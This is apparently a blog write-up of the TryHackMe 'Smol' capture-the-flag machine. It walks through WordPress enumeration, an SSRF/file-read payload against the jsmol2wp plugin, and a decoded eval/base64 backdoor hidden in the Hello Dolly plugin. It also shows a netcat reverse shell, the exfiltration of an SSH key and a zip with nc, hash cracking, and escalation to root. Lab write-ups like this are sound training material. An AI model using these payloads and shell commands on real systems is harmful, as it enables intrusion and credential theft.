---
layout: post
title: "TryHackMe Smol Writeup"
date: 2025-04-23 10:00:00 +0000
categories: [CTF, TryHackMe]
tags: [tryhackme, Smol, walkthrough, hacking, ctf]
image:
  path: /assets/img/smol/smol.png
  alt: "Smol Machine"
---

## Overview

**Smol** is a TryHackMe machine designed to teach enumeration, web application vulnerabilities, and basic privilege escalation techniques.

- Difficulty: Medium
- IP Address: `<IP>`
- Creator: josemlwdf

## Enumeration

We begin with a standard Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -Pn -p- <IP> -oN nmap.txt
```

```
# Nmap 7.95 scan initiated Mon Apr 21 09:56:10 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -p- -oN nmap.txt -vvv <IP>
Nmap scan report for <IP>
Host is up, received user-set (0.057s latency).
Scanned at 2025-04-21 09:56:23 CEST for 50s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 21 09:57:13 2025 -- 1 IP address (1 host up) scanned in 63.30 seconds

```

Nmap reveals two open ports:

- **22** (`SSH`)
- **80** (`HTTP`)

Before browsing to the IP (`http://<IP>`) we should add it to the hosts file
```bash
sudo echo <IP> www.smol.thm >> /etc/hosts
```

## HTTP

{: width="1200" height="600"}

If we scroll to the end of the page we see that the site is powered by wordpress
![poweredByWordpress](/assets/img/smol/poweredByWP.png){: width="1200" height="600"}

We can see it too if we run `whatweb`
![whatweb](/assets/img/smol/whatweb.png){: width="1200" height="600"}

So lets run `wpscan`
```bash
wpscan --url https://www.smol.thm
```
```bash
______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[32m[+][0m URL: http://www.smol.thm/ [<IP>]
[32m[+][0m Started: Mon Apr 21 10:09:24 2025

Interesting Finding(s):

[32m[+][0m Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[32m[+][0m XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[32m[+][0m WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[32m[+][0m WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[32m[+][0m WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [33m[!][0m The version is out of date, the latest version is 1.6
 | [31m[!][0m Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'


[34m[i][0m Plugin(s) Identified:

[32m[+][0m jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [31m[!][0m 2 vulnerabilities identified:
 |
 | [31m[!][0m Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [31m[!][0m Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt


[34m[i][0m No Config Backups Found.

[32m[+][0m WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[32m[+][0m Finished: Mon Apr 21 10:09:30 2025
[32m[+][0m Requests Done: 144
[32m[+][0m Cached Requests: 37
[32m[+][0m Data Sent: 36.455 KB
[32m[+][0m Data Received: 25.773 KB
[32m[+][0m Memory used: 251.391 MB
[32m[+][0m Elapsed time: 00:00:06

```

This site is using a plugin with 2 vulnerabilities identified:
![wpscanVulns](/assets/img/smol/wpscanVulns.png){: width="1200" height="600"}

Lets search for the SSRF vulnerability:
we found this repo in github with an example of a valid payload:
`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`
[CVE-2018-20463](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt)

Now we have credentials for the wordpress database.
![wp-config](/assets/img/smol/wp-config.png){: width="1200" height="600"}

But, what if we enter this credentials in the wordpress login page?
We successfully login as wordpress user.
![wp-admiLogin](/assets/img/smol/wp-admiLogin.png){: width="1200" height="600"}


Checking the pages we found a private page titled `Webmaster Tasks!!`.
Entering the page we can read what looks like a security check list.
In the first point we have `[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.`
![checklist](/assets/img/smol/checklist.png){: width="1200" height="600"}


`Hello Dolly` is a plugin that when activated, it displays random lyrics from the song “Hello, Dolly!” in the top right corner of the WordPress admin dashboard.
![helloDollyMessage](/assets/img/smol/helloDollyMessage.png){: width="1200" height="600"}

Time to inspect the source code of the `Hello Dolly` plugin.
`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php`
```bash
curl http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php | batcat
```
![helloDollyEval](/assets/img/smol/helloDollyEval.png){: width="1200" height="600"}

There is an interesting line in the hello_dolly function:
```php
 function hello_dolly() {
      eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
````
Decoding base64.
```bash
$ echo CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA= | base64 -d

if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```
And using chatGPT.
![chatGPT](/assets/img/smol/chatGPT.png){: width="1200" height="600"}

ChatGPT even told us what this code does, so lets try with `?cmd=ls`.
![rce](/assets/img/smol/rce.png){: width="1200" height="600"}

## Getting a Shell

We attempt a reverse shell

First: Set up a listener.
```bash
nc -lvnp 4444
```

Second: Send the payload.
`rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.9.2.102%204444%20%3E%2Ftmp%2Ff`
![revShellRCE](/assets/img/smol/revShellRCE.png){: width="1200" height="600"}

And we get a reverse shell.
![reverseShell](/assets/img/smol/revShell.png){: width="1200" height="600"}

Now I recommend upgrade the shell to avoid exiting it by mistake.
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
$ stty raw -echo; fg
$ export SHELL=bash
```

## Shell as diego

Previously we found some credential for the wordpress database.

```bash
mysql -u wpuser -h localhost wordpress -p
```
```sql
show databases;
use wordpress;
show tables;
select * from wp_users; 
```
![wpDatabase](/assets/img/smol/wpDatabase.png){: width="1200" height="600"}

### Cracking passwords

Time to crack some hashes.

Save the hashes.
```bash
nano hashes.txt
```
And paste.
`$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1`

Crack.
```bash
hashcat -m 400 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
```

Result: `$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:sandiegocalifornia`

I tried to login by ssh but I wasn't allowed.
```bash
$ ssh diego@www.smol.thm
diego@www.smol.thm: Permission denied (publickey).
````

So I tried to switch users in the reverse shell.
```bash
www-data@smol:/var/www/wordpress/wp-admin$ su diego
Password:
diego@smol:/var/www/wordpress/wp-admin$ cat /home/diego/user.txt
```

## Shell as think

Searching in others users directories we found a private ssh key in think´s directory. I just needed to download it and login as think

```bash
# In my kali machine
nc -lvnp 6969 > id_rsa

# Victim´s machine
cat .ssh/id_rsa | nc 10.9.2.102 6969

# Kali
chmod 600 id_rsa
ssh think@www.smol.thm -i id_rsa
``` 

## Shell as gege

Now that we don't have more credentials, we can try to login as other users with no passwords and pray for weak configurations or leftover accounts that don't enforce authentication properly.

```bash
think@smol:~$ su gege
gege@smol:/home/think$ id
uid=1003(gege) gid=1003(gege) groups=1003(gege),1004(dev),1005(internal)
```
Voilà. Gege doesn't need password to log in.


## Shell as xavi

Checking the home directory we found an interesting zip but we need a password.
```bash
gege@smol:/home$ cd gege/
gege@smol:~$ ls
wordpress.old.zip
gege@smol:~$ unzip wordpress.old.zip
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password:
```

However I´m going to try to crack it.

```bash
# kali
nc -lvnp 6969 > wordpress.old.zip

# Victim
cat wordpress.old.zip | nc 10.9.2.102 6969

# Kali
zip2john wordpress.old.zip > zip_hash
john zip_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Result: `hero_gege@hotmail.com (wordpress.old.zip)`

```bash
 cat wordpress.old/wp-config.php
```

Reading the wp-config.php file, we found more database credentials:
![oldWP-config](/assets/img/smol/oldWP-config.png){: width="1200" height="600"}

Login as `xavi`
```bash
gege@smol:~$ su xavi
Password:
xavi@smol:~$ id
uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
```

## Shell as root

Checking `sudo -l`
```bash
xavi@smol:~$ sudo -l
[sudo] password for xavi:
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```

We can run all as root.
```bash
xavi@smol:~$ sudo su 
root@smol:~$ id
uid=0(root) gid=0(root) groups=0(root)
root@smol:~$ cat /root/root.txt
bf89ea3ea01992353aef1f576214d4e4
```
---
Thanks for reading!